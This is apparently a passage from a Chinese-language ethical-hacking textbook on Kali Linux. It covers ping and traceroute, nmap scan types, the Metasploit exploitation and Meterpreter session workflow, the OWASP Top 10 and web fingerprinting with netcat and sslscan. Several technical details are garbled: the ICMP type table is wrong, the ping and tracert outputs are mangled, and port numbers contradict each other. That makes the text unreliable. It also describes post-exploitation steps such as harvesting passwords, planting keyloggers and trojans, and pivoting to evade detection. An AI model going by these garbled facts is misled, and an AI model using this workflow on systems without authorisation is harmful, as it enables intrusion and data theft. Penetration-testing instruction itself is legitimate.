  ```\n这将弹出 `wget` 命令的 man 页面。选项有：\n- -m：启用镜像网站设置；\n- -p：前提或页面，确保下载所有文件，包括图片文件；\n\
  - -E：扩展名，确保所有下载的文件以 `.html` 扩展名存储；\n- -k：转换链接使其适合本地查看；\n- -K：创建一个 `.orig` 扩展名的原始文件备份。\n\
  \n从网站复制的文件将存储在与网站同名的文件夹中。当复制页面时，如果下载包含 PHP 的页面，可能会出现错误。发生在发生在页面过度依赖服务器端脚本来显示页面内容时。此类页面无法被克隆网站的工具访问。下载文件后，将其限制在道德黑客团队进行评估。在线发布此类网站可能会违反版权相关法律。\n\
  \n\n\n\n\n| 类型 | 代码 |  |\n| :--- | :--- | :--- |\n| 0(回显响应) | 0 | 回显响应 |\n| 8(目的不可达)\
  \ | 0 | 目标网络不可达 |\n| 1 | | 目标主机不可达 |\n| 2 | | 目标协议不可达 |\n| 3 | | 目标端口不可达 |\n| 6\
  \ | | 目标网络未知 |\n| 7 | | 目标主机未知 |\n| 9 | | 管理上禁止访问网络 |\n| 10 | | 管理上禁止访问主机 |\n| 13\
  \ | | 管理上禁止通信 |\n| 8(回显请求) | 0 | 回显请求 |\n\n\n\n\n# 8 (回显请求) 0 回显请求\n\n## Ping\n\
  `PingPing` 是用户直接接触的少数基于 ICMP 的应用程序之一。`ping` 命令会发送一个类型为 8、代码为 0 的包，表示该包是一个回显请求（echo\
  \ request）。接收到包的系统会立即返回一个类型为 0、代码为 0 的包，即回显回复（echo reply）。成功的 `ping` 表示被 `ping`\
  \ 的系统在网络上是活跃的，因此是一个活跃的主机。如果你在 Windows 命令行中使用 `ping` 命令，它默认会发送四次请求，而 Linux 终端上的 `ping`\
  \ 命令将持续运行，直到被用户中断。\n\n让我们来看一个成功和一个失败的 `ping` 命令。\n\n如果被 ping 的主机是活跃的：\n```\nPing\
  \ 192.168.1.1\nPinging 192.168.1.1 with 32 bytes of data:\nReply from 192.168.1.1:\
  \ bytes=32 time=2ms TTL=64\nReply from 192.168.1.1: bytes=32 time=1ms TTL=64\nReply\
  \ from 192.168.1.1: bytes=32 time=1ms TTL=64\nReply from 192.168.1.1: bytes=32 time<1ms\
  \ TTL=64\n```\n\n如果主机不可达：\n```\nPing 192.168.1.200\nPinging 192.168.1.200 with 32\
  \ bytes of data:\nReply from 192.168.1.129: Destination host unreachable.\nReply\
  \ from 192.168.1.129: Destination host unreachable.\nReply from 192.168.1.129: Destination\
  \ host unreachable.\nReply from 192.168.1.129: Destination host unreachable.\nPing\
  \ statistics for 192.168.1.200:\nPackets: Sent 5 4, Received 5 4, Lost 5 0 (0% loss)\n\
  ```\n\n## Traceroute\n`traceroute` 利用 ICMP `ping` 命令来确定在发起追踪的计算机系统和目标系统之间有多少个网络设备。`traceroute`\
  \ 命令通过操作网络包的存活时间（Time To Live，也称为 `TTL`）来工作。`TTL` 表示同一个网络包在过期之前，被网络上下一个主机可以再次广播的次数。该命令为包分配一个初始\
  \ `TTL` 值 1，表示该包只能在发起系统和目标系统之间再被一个设备广播。接收到的设备将回回一个 ICMP 类型 11、代码 0 的包，表示时间超时（time\
  \ exceeded），且该包已被记录。发送者随后将包的 `TTL` 增加一并发送下一组包。包根据其存活时间到达网络上的下一跳。结果是，接收路由器会发送另一个表示时间超时的回复。这个过程一直持续，直到包到达目标，并且路径上的所有跳都被记录。这会导致打印出一份存在于发起系统和目标系统之间的设备列表。此命令可以帮助渗透人员了解网络上存在种种设备。Windows\
  \ 设备的默认 `TTL` 为 128，Linux 设备为 64，Cisco 网络设备为 255。\n\nWindows 系统上的 `traceroute` 命令是\
  \ `tracert`。在 Linux 系统上，它是 `traceroute`。Windows 系统上的 `tracert` 命令将产生如下输出。让我们以追踪到\
  \ google.com 为例：\n```\ntracert www.google.com\nTracing route to www.google.com [74.125.227.179]\n\
  Over a maximum of 30 hops:\n1 1 ms<1 ms 1 ms 192.168.1.12 7 ms 6 ms 6 ms 10.10.1.23\
  \ 7 ms 8 ms 7 ms 10.10.1.454 9 ms 8 ms 8 ms 10.10.25.455 9 ms 10 ms 9 ms 10.10.85.996\
  \ 11 ms 51 ms 10 ms 10.10.64.27 11 ms 10 ms 10 ms 10.10.5.888 11 ms 10 ms 11 ms\
  \ 216.239.46.2489 12 ms 12 ms 12 ms 72.14.236.9810 18 ms 18 ms 18 ms 66.249.95.2311\
  \ 25 ms 24 ms 24 ms 216.239.48.412 48 ms 46 ms 46 ms 72.14.237.21313 50 ms 50 ms\
  \ 50 ms 72.14.237.21414 48 ms 48 ms 48 ms 64.233.174.13715 47 ms 47 ms 46 ms dfw06s32-in-f190.net\
  \ [74.125.227.179]\nTrace complete.\n```\n\nKali Linux 上有多种工具使用 TCP、UDP 和 ICMP 协议扫描目标。成功扫描的结果将为您提供主机名、IP\
  \ 地址、操作系统和服务等信息。一些扫描工具还可以扫描阶段发现漏洞。\n\n## 扫描工具\n\n### Nmap：扫描器之王\n`nmap` 是道德黑客最常用的扫描工具，因为它不仅可以列出网络上的活动主机，还能确定操作系统、服务，甚至在某些情况下发现凭据。`nmap`\
  \ 使用命令、开关和选项在扫描阶段获取目标的详细信息。\n\n### Nmap 命令结构\n`nmap` 命令具有独特的结构，允许灵活地使用开关和命令。下图展示了其语法的各个部分：Image00004.jpg\n\
  \n- `-s`：扫描中的小写 `s` 前缀指示 `nmap` 在定义的目标上进行特定类型的扫描。小写 `s` 后面跟着大写的 `S`，这种扫描类型可以帮助道德黑客规避目标网络安全系统的检测。\n\
  - `-sS` 隐扫描（Stealth Scan）：即使没有指定选项，`nmap` 扫描也会执行隐扫描。或者，你也可以通过向 `nmap` 命令附加 `-sS`\
  \ 选项故意启动隐扫描。隐扫描将与目标系统建立 TCP 连接但不会完成三次握手。发送者向目标系统发送一个 `SYN` 包，目标系统将回复 `SYN/ACK` 包。然而发送者不会回\
  \ `ACK` 包，因为通信通道尚未建立。大多数现代系统会在等待 `ACK` 包一段时间后自动关闭连接，但较旧系统可能不会关闭连接，这种扫描可以完全不被发现，由于与其他使用的扫描技术相比，它更难检测。\n\
  - `-sT` TCP 连接扫描（Connect Scan）：TCP 连接扫描完成三次握手并与目标系统建立正式连接。因此，它可以比隐扫描收集更多信息。发送者向目标系统发送一个\
  \ `SYN` 包，目标系统将回复 `SYN/ACK` 包。发送者随后向目标系统发送 `ACK` 包并建立通信通道。目标网络上的安全系统大多会记录这种扫描，因为它提供了大量信息。\n\
  - `-sU` UDP 扫描：UDP 扫描用于分析目标系统的 UDP 端口。与 TCP 端口不同，UDP 扫描期望从目标系统获得关于关闭的端口的回复。如我们所知，当向系统的\
  \ UDP 端口发送包时，没有收集到响应。然而，如果目标系统有响应，你可以得出该 UDP 端口是开启的。或者是被防火墙过滤。\n- `-sA`：`-sA` 扫描是一种\
  \ ACK 扫描，用于理解 TCP 端口是否被过滤。扫描通过发送 `ACK` 标记与目标系统建立通信。理想情况下，使用 `SYN` 标记启动连接，但此 `ACK`\
  \ 标记有时可以伪装成系统内部请求的 ACK 回复来绕过防火墙。如果此扫描接收到重置（RST）响应，则表明端口未被过滤。如果没有收到响应，或者收到代码为 1、9、10\
  \ 或 13 的类型 3 ICMP 响应，则意味着端口被过滤。\n\n### 时间选项\n我们已经过的，如果没有指定，`nmap` 使用的默认选项是 `-T3`\
  \ 或普通（normal）。`nmap` 扫描有几种时间模板可用：\n- `-T0` 紧张（Paroid）：`-T0` 紧张扫描用于网络链路较慢或你面临被检测风险的情况。扫描以串行方式工作，并每五分钟暂停一次。\n\
  - `-T1` 狡猾（Sneaky）：`-T1` 也称为狡猾扫描，比紧张扫描快一点，从而在保持隐藏的同时缩短完成扫描的时间。该值被忽略。\n- `-T2` 礼貌（Polite）：`-T2`\
  \ 也称为礼貌扫描，速度比 `-T0` 和 `-T1` 快，是最后一个使用串行技术的时间模板。此扫描的 `delay` 值为 400 毫秒，默认设置为 1 秒。\n\
  - `-T3` 普通（Normal）：`-T3` 也称为普通扫描，是 `nmap` 的默认时间模板。这意味着即使你没有指定时间模板，`nmap` 也将使用 `-T3`\
  \ 的设置进行扫描。该模板使用并行处理，意味着它同时向目标系统发送多个探测包，导致速度增加。\n- `-T4` 激进（Aggressive）：`-T4` 称为激进扫描，适用于网络速度较快的情况。\n\
  - `-T5` 疯狂（Mad）：`-T5` 称为疯狂扫描，是最快的模板，适用于网络非常快的情况。\n\n\n\n\n\n| 攻击向量 | 攻击类型 |\n| :---\
  \ | :--- |\n| 代码注入 | 病毒、缓冲区下溢、缓冲区溢出、恶意软件 |\n| 基于 Web | 跨站脚本 (XSS)、跨站请求伪造 (CSRF)、网页篡改、SQL\
  \ 注入 |\n| 基于网络 | 拒绝服务 (DoS)、分布式拒绝服务 (DDoS)、密码和敏感数据窃取、凭据窃取或伪造 |\n| 社会工程学 | 钓鱼、冒充、鱼叉网络钓鱼、情报收集\
  \ |\n\n当你不仅理解攻击的类型，还理解实施攻击的手段时，你就能真正理解利用。\n\n## 本地漏洞\n需要对计算机系统、服务器、手机等具有本地访问权限的漏洞被称为本地漏洞。对系统的本地访问也可以通过远程会话建立。换句话说，如果道德黑客物理坐在目标系统附近，或者通过\
  \ `SSH`、远程桌面协议 (`RDP`) 或虚拟专用网络 (`VPN`) 登录该系统，该漏洞就可以被称为本地漏洞。本地漏洞可用于增加你在系统上的权限、破坏服务、上传恶意文件或从系统中窃取信息。请注意，除非你建立了之前提到的此类网络会话，否则无法从网络实施本地漏洞。如果你尝试在不在漏洞本地系统上执行代码的情况下实施本地漏洞，将导致代码失败。这甚至可能触发目标系统安全系统的警报，而一旦触发警报，对于道德黑客来说就被认为浪费了时间和精力。\n\
  \n大众对于如何利用本地漏洞存在误解。本地漏洞并不一定需要由道德黑客亲自执行。道德黑客可以利用社会工程学和其他欺骗手段，欺骗已登录本地的用户代表他们执行本地漏洞。其中一个非常常见的例子是嵌入在普通\
  \ `PDF` 文档文件或 Microsoft `Excel` 表格中的木马后门。一个以员工名义递送并随后插入公司系统的 `USB` 优盘也可以被用于执行本地漏洞。本地漏洞的可能性仅限于道德黑客或渗透测试者的想象力。当远程漏洞由于无法建立目标系统的网络连接而失败时，通常会部署本地漏洞。\n\
  \n### 寻找本地漏洞\n本地利用系统的方法有上千种，在刚开始选择最高效的方法可能有些困难。由 `Rapid7` 开发的 Metasploit 工具通过开发一个名为\
  \ `Searchsploit` 的应用程序使这一切变得简单。`Kali Linux` 让使用该应用程序变得更容易。你可以在 `Kali Linux` 终端中使用\
  \ `searchsploit` 来查找系统中的漏洞。\n\n步骤如下：\n- 启动终端窗口。\n- 输入 `searchsploit` 命令，后跟最多三个关键词。\n\
  \n搜索返回了在运行 `IIS` Web 服务器并使用 `PHP 5.2.0` 版本的 `Windows` 系统具有动态链接库的漏洞。你可以利用此漏洞执行缓冲区溢出，导致主机系统发生拒绝服务。\n\
  \n## 远程漏洞\n从相应设备的基础操作系统外部针对计算机系统、服务器、手机等攻击的漏洞被称为远程漏洞。因为它总是通过网络进行，它也被称为网络漏洞。简单来说，当漏洞不是本地的时，它就是远程漏洞。远程漏洞被用于攻击计算机系统、服务器或网络设备，以及\
  \ Web 应用程序、Web 服务、数据库、手机、打印机以及任何可以连接到网络的设备。随着技术的进步，可以使用远程漏洞攻击的设备数量不断增加。例如，游戏主机如\
  \ `Microsoft Xbox`、`Sony Playstation`、智能电视、音乐系统等等，类比无穷完。\n\n另一个例子是最新汽车中的计算机系统。如果汽车中有一个连接到公共网络的计算机系统，世界上某些攻击者已经在尝试黑入它，大多是为了制造一些麻烦。在本章之后学习\
  \ `Metasploit` 工具时，我们将获得一个远程漏洞的详细示例。\n\n## Metasploit 概述\nMetasploit 是道德黑客工具箱中最强大的工具之一。它汇聚了世界各地道德黑客、渗透测试员、政府和研究人员多年尝试的成果。从光谱的“黑帽”到“白帽”以及其间的所有领域，每位黑客都曾接触过\
  \ Metasploit 框架。Metasploit 工具由一家名为 `Rapid7` 的公司开发。该公司在开发这个酷东西时不惜成本，使得 Metasploit\
  \ 能够执行成功渗透测试活动所需的所有阶段。除了攻击阶段外，Metasploit 还有报告模板和合规性检查以满足政府要求。如果你是第一次使用 Metasploit，你会感到惊讶的。\n\
  \n### Metasploit 的版本\n目前有两个版本的 Metasploit 可用。第一个版本称为 `express framework`，默认安装且免费使用。该版本主要侧于满足学生、研究人员和私用用户的需求。第二个版本称为\
  \ `professional version`，满足专业、商业领域以及政府部门的需求。专业版提供了额外功能，如小组协作、报告、合规检查以及用于高级控制的工具。专业版需要付费，因此如果你只是将\
  \ Metasploit 用于个人使用，则没有必要购买专业版。快速版和专业版都包含相同的漏洞模块。\n\n### Nexpose 与合规性\n安全审计员对合规要求了如指掌。`Nexpose`\
  \ 帮助审计员简化公司安全相关的风险管理。`Nexpose` 的功能比 Metasploit 扫描漏洞更多。在扫描漏洞后，`Nexpose` 对其进行分类以分析其可能产生的影响，然后将其转换为整洁的报告。除了漏洞扫描，`Nexpose`\
  \ 还确保符合各项法规标准，例如`支付卡行业数据安全标准 (PCI DSS)`、`北美电力可靠性标准 (NERC)`、`健康保险流动性法 (HIPAA)`、`美国政府配置基准\
  \ (USGCB)`、`2002 联邦信息安全管理法 (FISMA)`、`安全内容自动化协议 (SCAP)`、`联邦桌面核心配置 (FDCC)` 等。\n\n\
  ## 基础 Metasploit 框架\nMetasploit 基于模块工作。如果你将它想象成一辆车，就能更好地理解这个框架。将框架想象成 `詹姆斯·邦` 拥有的阿斯顿\
  \ Martin 底盘。底盘为汽车使用的所有其他模块提供了容器。引擎周围的角落都储备了工具库。即使汽车中的某个模块发生故障，汽车仍然可以使用可用的工具发动攻击。Metasploit\
  \ 有五种类型的模块：\n\n1. `Exploit Modules`\n2. `Auxiliary Modules`\n3. `Payloads`\n4. `Listeners`\n\
  5. `Shellcode`\n\n\n\n\n\n# 漏洞模块 (Exploit Modules)\n数据库中预定义的代码包可用于发现目标系统（无论是本地还是远程）的漏洞并破坏系统，这些被称为利用模块。利用模块可以实现对敏感信息的拒绝服务（DoS）访问，或者上传可用于进一步利用的载荷模块。\n\
  \n## 辅助模块 (Auxiliary Modules)\n辅助模块不需要像利用模块那样需要载荷即可运行。相反，辅助模块包含模糊测试器（fuzzers）、扫描器（scanners）和\
  \ SQL 注入工具等程序。辅助模块 true 一些非常强大的工具，使用时需要极其谨慎。伦理黑客可以使用辅助模块中提供的大量扫描器来了解目标系统的漏洞，然后平滑过渡到利用模块。\n\
  \n## 载荷 (Payloads)\n如果将詹姆斯·邦德的阿斯顿马丁比作整个 Metasploit 框架，那么利用模块和辅助模块就是它的火箭发射。从这个意义上说，载荷指的是部署在目标上以维持追踪和通信的通信设备。当你在有漏洞的机器上执行利用时，载荷将作为附件发送到利用程序。载荷包含了由被利用系统执行的指令。载荷有不同的类型。其中一些是行代码，而另一些可能是像\
  \ `Meterpreter Shell` 这样的完整应用程序。Metasploit 框架内置了超过 200 种不同类型的载荷。\n\n## 监听器 (Listeners)\n\
  即使是詹姆斯·邦德也必须听从 M 的指令。监听器是 Metasploit 框架中提供的处理器。当载荷部署在目标系统上时，它会创建一个会话，监听器用于与这些会话交互。监听器可以是一个等待传入连接的休眠\
  \ bind shell，也可以主动监听来自目标系统会话的传入连接。如果没有监听器，伦理黑客系统与目标系统之间无法进行双向通信。幸运的是，Metasploit\
  \ 框架负责监听器的设置，只需要极少的人工交互。\n\n## Shellcode (Shellcode)\nShellcode 本身并不完全是一个独立的模块。它是作为子模块嵌入在\
  \ Metasploit 框架的载荷模块中的。就像阿斯顿马丁导弹中存在的爆炸物一样，shellcode 是载荷模块内部的爆炸物。shellcode 是创建漏洞、上传恶意代码并通过载荷执行命令，从而在目标系统上生成会话或\
  \ shell 的爆炸物。并不是所有载荷都需要包含 shellcode。例如，`windows/adduser` 载荷将在目标系统上创建用户。\n\n## 访问\
  \ Metasploit (Accessing Metasploit)\n有几种方法访问 Metasploit 。在深入理解 Metasploit 之前，我们建议使用图形用户界面方法。你可以如下所示从\
  \ Kali Linux 桌面选择 Metasploit Community/Pro 来访问 GUI：\n`Applications > Kali > Exploitation\
  \ > Metasploit > Metasploit Community/Pro`\n\n此外，也可以通过浏览器在 3720 端口通过以下 URL 访问：\n\
  `https://local-host: 3790/`\n\n注意：由于 Metasploit 在本地主机运行，因此 Metasploit 没有安装有效的证书。浏览器可能会提示你“连接不安全”（Connection\
  \ is Insecure）的消息。你可以点击“我理解风险”（I Understand the Risks）并继续“添加异常”（Add Exception）。如果弹出提示，点击“确认安全异常”（Confirm\
  \ Security Exception）按钮。\n\n首次启动 Metasploit 将提示你设置用户名和密码。还有一些其他可选参数。可选参数用于报告。在你提供所有输入参数后，点击“创建账户”（Create\
  \ Account）继续。\n\n## 启动/停止 (Startup/Shutdown)\n作为伦理黑客，你有时可能需要重启 Metasploit。Metasploit\
  \ 是一个资源密集型应用程序，你的 Kali Linux 系统上有几个应用程序可能需要网络服务，导致 Metasploit 有时冻结。如果你遇到网络错误，可以随时重启\
  \ Metasploit。\n\n从检查 Metasploit 的当前状态开始。你可以从 Kali Linux 终端运行以下命令来实现：\n\n检查服务状态\n\
  ```bash\nservice metasploit status\n```\n重启服务\n```bash\nservice metasploit restart\n\
  ```\n停止服务\n```bash\nservice metasploit stop\n```\n\n## 更新 Metasploit 数据库 (Updating\
  \ the Metasploit Database)\nRapid7 开发了 Metasploit，但每天都有来自社区用户的多次输入。因此，建议在每次使用之前更新\
  \ Metasploit 数据库。只需在 Kali Linux 终端上输入以下命令即可：\n```bash\nmsfupdate\n```\n输入命令并按回车后，你只需坐等。如果你已经在\
  \ Metasploit 的图形用户界面中，可以点击网页右上角的“软件更新”（Software Updates），然后在下一页上点击“检查更新”（Check for\
  \ updates）。\n\nMetasploit 将立即下载并安装更新。我们建议在每次更新后重启 Metasploit 服务以使更改生效。对于 Metasploit\
  \ 界面，只需关闭浏览器并重新打开 Metasploit 界面即可。\n\n## 使用 Metasploit (Using Metasploit)\n现在阿斯顿马丁已经准备就绪，是时候进入战场开始扫描了。当你使用创建的用户名和密码登录\
  \ Metasploit 界面时，你将看到登录页面。该页面有当前项目、目标文件夹、发现的可能漏洞等摘要。作为首次用户，你只会看到一个默认项目。当你开始使用更多项目时，项目将会在落地页上堆积。使用“新项目”（New\
  \ Project）按钮时，项目将开始在落地页上堆积。要开始扫描，点击默认项目 Discovery 部分的“扫描”（Scan）按钮。你还会看到“目标设置”（Target\
  \ Settings）部分，它允许你为主机或一组主机提供输入，例如 Nmap。当你点击页面中心的“高级选项”（Advanced Options）按钮时，可以在\
  \ Target Settings 中找到某些重要且有用的字段。\n\n排除目标 (Excluded Targets)\n你在该字段中指定的任何 IP 都将从扫描中排除。如果你不想扫描某些机器，可以在此字段输入你的系统和任何其他成员的\
  \ IP 地址。此外，rules of engagement 可能会定义某些不应扫描的机器。\n\n执行初始端口 (Perform Initial Port)\n\
  第一次对目标系统进行扫描时，勾选此框。当对目标系统重复扫描时，可以取消勾选，以免浪费时间。\n\n自定义 Nmap 参数 (Custom Nmap Arguments)\n\
  当伦理黑客需要运行自定义模块时，可以使用此选项。可以在这里定义自定义开关。\n\n额外的 TCP 端口 (Additional TCP Ports)\n默认 Metasploit\
  \ 扫描将针对最常见的端口。如果伦理黑客有关于端口的独特信息，可以在此处将其包含在扫描中。\n\n排除 TCP 端口 (Exclude TCP Ports)\n\
  rules of engagement 可能会定义某些不应扫描的端口。这些可以在这里定义。\n\n自定义端口范围 (Custom Port Range)\n如果你有多个目标，可以在它们之间分配范围。\n\
  \n自定义 TCP 源端口 (Custom TCP Source Port)\n有时你可能想要伪装你的系统源端口。这对绕过防火墙很有用。在开始扫描后，可能需要一些时间完成，Metasploit\
  \ 非常高效，但后台运行着大量进程。\n\n扫描完成后，点击网页顶部的“概览”（Overview）标签。discovery 部分显示已扫描的主机。如果包含了自定义参数，可能会发现更多漏洞。使用\
  \ Nexpose 进行合规性检查也是这样。如果你点击“分析”（Analysis）标签，将获得所有扫描主机的列表。如果你点击主机的 IP，将获得更多信息。有六个重要部分为你提供有关主机的信息：\n\
  \n服务 (Services)\n服务部分的可用信息将告诉你目标系统上的软件及其版本。在扫描期间获取了有关它们的更多信息。某些服务可能有超链接。\n\n漏洞 (Vulnerabilities)\n\
  目标系统中发现的所有漏洞都将列在这里。这里列出的漏洞已与 Metasploit 利用程序链接，以便进行直接利用。\n\n文件共享 (File Shares)\n\
  如果目标系统上有文件共享，它们将列在这里。然而，Linux 系统上的文件共享不像 Windows 系统上那样公开显示。\n\n备注 (Notes)\n扫描期间发现的安全设置、服务帐户、共享将列在这里。\n\
  \n凭据 (Credentials)\n如果扫描捕捉到了任何凭据，它们将列在这里。\n\n模块 (Modules)\n模块部分不仅与利用模块有关，它还让你直接启动与发现的漏洞相关的利用。如果你点击链接，利用程序将启动并尝试与目标系统建立会话。点击模块旁的启动（Launch）链接。扫描返回了\
  \ `Exploit: Java RMI Insecure Configuration Java Execution`。你将看到一个描述漏洞性质的页面，并填充利用发现漏洞所需的所有信息。默认，Metasploit\
  \ 将使用通用载荷以及 Meterpreter shellcode。在检查设置后，点击“运行模块”（Run Module）。\n\n如果利用成功，你应该看到“成功！在主机上创建了一个会话”的消息。这表示你成功利用了目标系统的漏洞，它现在已被破坏。当目标系统被利用时，其上部署了一个\
  \ Meterpreter shell，你现在会在“会话”（Sessions）标签中看到 #1，用于与目标系统交互。点击“会话”（Session）查看所有活动会话。Sessions\
  \ 网页将显示所有可用会话及其与目标系统交互的关联 shell。有一个小描述列出了可以访问目标系统的帐户。点击“会话 1”（Session 1）链接，将启动与目标系统上\
  \ Meterpreter shell 的网页交互。\n\n## Meterpreter Shell - 会话管理 (Meterpreter Shell - Session\
  \ Management)\n在 Meterpreter shell 部署到目标系统后，伦理黑客可以通过 Meterpreter 中的会话管理访问 shell。然而，许多高级功能可以通过简单的按钮点击驱动，它们也有助于加速利用的管理。作为伦理黑客，你需要在时间和和执行之间找到完美的平衡。如果你执行了错误的步骤，目标系统可能会触发安全警报。如果你没有执行所需的操作，会话时间将会浪费。\n\
  \n伦理黑客可以看到在目标系统上执行的所有可用操作，以及会话历史和利用后使用的模块标签页。你通过此会话执行的任何操作都会记录以供以后参考。你还可以导出这些日志，用于渗透测试生命周期最后阶段的报告。\n\
  \n## 会话内部的操作 (Actions Inside a Session)\n你将在会话内部执行以下操作：\n\n收集系统数据 (Collect System\
  \ Data)\n这将从目标系统收集敏感和关键数据，如密码、截图和系统信息。此按钮等同于第一站式购物功能。你不需要在每个会话中获取 root 用户的信息。\n\n\
  访问文件系统 (Access File System)\n此按钮让你访问目标系统的文件系统并上传或删除文件。如果目标系统是 Web 服务器，上传键盘记录器、木马和其他恶意工具将对你有帮助。\n\
  \n命令 Shell (Command Shell)\n此选项适用于高级伦理黑客。它让你与目标系统的 shell 进行交互。如果没有 root 凭据，伦理黑客将在命令行中操作。\n\
  \n创建代理跳转 (Create Proxy Pivot)\n使用目标系统作为网关进行跳转。如果目标系统是其他系统的代理，它可以访问所有其他系统。\n\n创建\
  \ VPN 跳跃 (Create VPN Pivot)\n你可以将目标系统转换为 VPN 网关并通过其引导流量。这与创建代理按钮非常相似，只是所有流量通过加密的\
  \ VPN 隧道。这有助于想要规避检测系统的伦理黑客。\n\n终止会话 (Terminate Session)\n此按钮将终止主机上的所有会话并从中删除 Meterpreter\
  \ shell。如果伦理黑客在目标系统上留下恶意软件，目标系统仍然处于破解状态。因此，在终止会话之前删除所有此类软件是重要的。\n\n\n\n\n\n1. 注入\n\
  2. 身份验证失效\n3. 敏感数据泄露\n4. XML 外部实体 (XXE)\n5. 访问控制失效\n6. 安全配置错误\n7. 跨站点脚本 (XSS)\n\
  8. 不安全反序列化\n9. 使用已知漏洞的组件\n10. 日志记录和监控不足\n\n\n\n你可以在 [`owasp.org/www-project-top-ten/`](https://owasp.org/www-project-top-ten/)\
  \ 上了解更多关于 2020 年十大 10 漏洞的信息。此外，OWASP 在全球设有本地分会，旨在提高对软件安全的意识。这些分会拥有安全成员，他们会讨论测试软件的新方法、进行培训、开发安全应用程序等。你只需要参加小组会议即可成为\
  \ OWASP 分会的成员。你可以通过上述的 URL 访问 OWASP 网站，并点击“Chapters”（分会）链接来搜索你附近的本地 OWASP 组。\n\n\
  # 测试 Web 应用程序\n\nKali Linux 许多工具，只需点击即可测试 Web 应用程序，但工具的力量只有在你知道何时使用以及如何使用它时才能发挥出巨大的威力。测试\
  \ Web 应用程序的渗透测试方法与伦理黑客方法论的前三个阶段相同，即侦察（Reconnaissance）、扫描（Scanning）和利用（Exploitation）。某些情况下可能还会利用最后两个阶段，即维持访问（Maintaining\
  \ Access）和报告（Reporting）。\n\n此外，在测试 Web 应用程序时，伦理黑客需要测试网站上的每一个 Web 页，而不仅仅是首页或登录页。如果你保护了网站的登录页，并不意味着你已经保护了整个\
  \ Web 应用程序，你就可以结束测试过程了。如今，攻击者目标网站有多种动机。因此，在测试网站或 Web 应用程序时，你不应该遗漏任何细节。\n\n让我们来看看测试\
  \ Web 应用程序的步骤。\n\n## 第 1 步：手动审查\n\n当你对目标系统运行端口扫描时，它可能会返回一个结果，显示 HTTP 运行在 `80` 端口。但这并不意味着网站也运行在\
  \ `80` 端口。你可以启动浏览器并导航到目标系统的 `80` 端口，以检查它是否在该端口提供网站服务。这不仅适用于 `80` 端口，端口扫描还可能返回运行在\
  \ `80` 或 `443` 端口以外的多个 Web 服务。确保你扫描了网站上的所有可用链接，因为它们可能包含有用信息。如果网站的访问控制机制提示你输入密码，请尝试多达\
  \ 10 个密码，或者直接按 Escape 键查看你是否可以直接绕过身份验证。打开每个 Web 页面的源代码，检查是否有开发人员留下的注释。这可能是一个耗时且无聊的过程，但世界上没有任何自动化工具可以识别所有的漏洞。因此，手动审查网站或\
  \ Web 应用程序是一个关重要的第一步。\n\n## 第 2 步：指纹识别\n\n对网站的手动审查无法提供 Web 服务器、Web 应用程序或操作系统的细节。使用\
  \ Kali Linux 进行指纹识别可以帮助确定这三者。\n\n### NetCat (nc)\n\nNetCat 是 Kali Linux 中的一个工具，可以作为指纹工具，也可以作为传入连接的监听器。在\
  \ Kali Linux 终端中使用 `NetCat` 命令的语法如下。\n\n```\nnc {host} {port}\n```\n示例：`nc 192.168.56.102\
  \ 80`\n\n此命令将与 IP 为 `192.168.56.102` 的主机建立连接，但在命令发送到 Web 服务器之前，将不会返回任何结果。使用 `NetCat`\
  \ 进行指纹识别有多种技术。你可以使用以下命令获取有关目标系统 Web 服务器和操作系统的信息。\n\n```\nnc 192.168.56.102 80\n\
  HEAD / HTTP/1.0\n```\n按两次 Enter 键。\n\n在我们示例的此命令结果中，目标系统在 Ubuntu Linux 操作系统上运行着 Apache\
  \ 2.2，PHP 版本为 `5.2.4-2ubuntu5.10`。这些信息将帮助伦理黑客缩小想要针对目标系统使用的工具和攻击范围。\n\n### SSLScan\
  \ (sslscan)\n\n如果你看到一个网站正在使用 SSL 证书，了解该网站使用的 SSL 加密类型是好的。浏览器地址栏中网站 URL 之前的锁头图标是网站正在使用\
  \ SSL 证书的指示。\n\n![](img/Image00006.jpg)\n\n`SSLScan` 工具查询服务器上的 TLSv1、SSLv2 和 SSLv3\
  \ 服务，检查是否有任何首选加密算法，并返回网站正在使用的 SSL 证书。在 Kali Linux 终端中使用的 `sslscan` 命令如下。\n\n```\n\
  sslscan {ipaddress} {port}\n```\n示例：`sslscan 192.168.56.102 80`\n\n## 第 3 步：扫描\n\
  \n自动化扫描将帮助减少扫描整个系统漏洞所需的时间。有多种应用程序可扫描 Web 服务器，一个优秀的伦理黑客不应该仅依赖单一应用程序。单一应用程序永远无法发现数千个安全缺陷并列出系统所有的漏洞。使用至少两个三个工具扫描\
  \ Web 应用程序是一种良好的做法。Nessus、WebInspect 和 Retina 等扫描应用程序是行业领先的，但价格昂贵。Kali Linux 有一组内置的扫描工具可以用于扫描。\n\
  \n让我们来看看其中。\n\n### Arachni\n\n`Arachni` 工具是一个 Web 应用程序扫描器，像 Nessus 一样从图形用户界面运行。唯一的区别是，与\
  \ Nessus 不同，`Arachni` 可以在特定时间对单个主机进行单独扫描。如果目标系统在多个端口上有多个 Web 服务，你需要每个新端口重复扫描。例如，如果\
  \ `http://helloworld.com` 在 `80` 端口托管了 Web 服务，而 `phpMyAdmin` 运行在 `443` 端口 (HTTPS)，你必须对\
  \ `Arachni` 进行单独扫描。然而，`Arachni` 扫描是高度自定义的。`Arachni` 有许多设置和插件允许特定的扫描。所有插件默认都启用。`Arachni`\
  \ 还支持以所有文件格式导出报告。\n\n你可以如下如下在 Kali Linux 中启动 `Arachni` Web 扫描器：点击 Applications >\
  \ Kali Linux > Web Applications > Vulnerability Scanners > `arachnid_web`\n\n![](img/Image00007.jpg)\n\
  \n这将启动终端窗口，指示 `Arachni` 服务正在启动。在 Kali Linux 中打开浏览器并导航到 [`127.0.0.1:4567`](http://127.0.0.1:4567)\
  \ 以访问 `Arachni` 界面，如下：\n\n![](img/Image0008.jpg)\n\n要在目标系统上启动扫描，将主机 IP 输入文本框并点击\
  \ `Scan` 按钮。\n\n![](img/Image0009.jpg)\n\n当扫描器运行时，过程将附加 `Dispatchers`。你可以同时运行多个调度器。如果你想对更多\
  \ Web 服务运行扫描，可以同时从 `Scan` 标签启动另一个扫描。当你正在进行扫描时，可以点击 `Dispatchers` 标签。在所有扫描完成后，Arachni\
  \ 会自动切换到 `Reports` 标签。伦理黑客可以从此标签以流行的文件格式导出报告。每个执行的扫描都有单独的报告。报告还提供条形图和饼图。\n\n![](img/Image0010.jpg)(Image0011.jpg)\n\
  \n`Arachni` 有两类报告：`Trusted` 和 `Untrusted`。`Trusted` 报告下的漏洞是准确的，因为应用程序在扫描期间没有收到 Web\
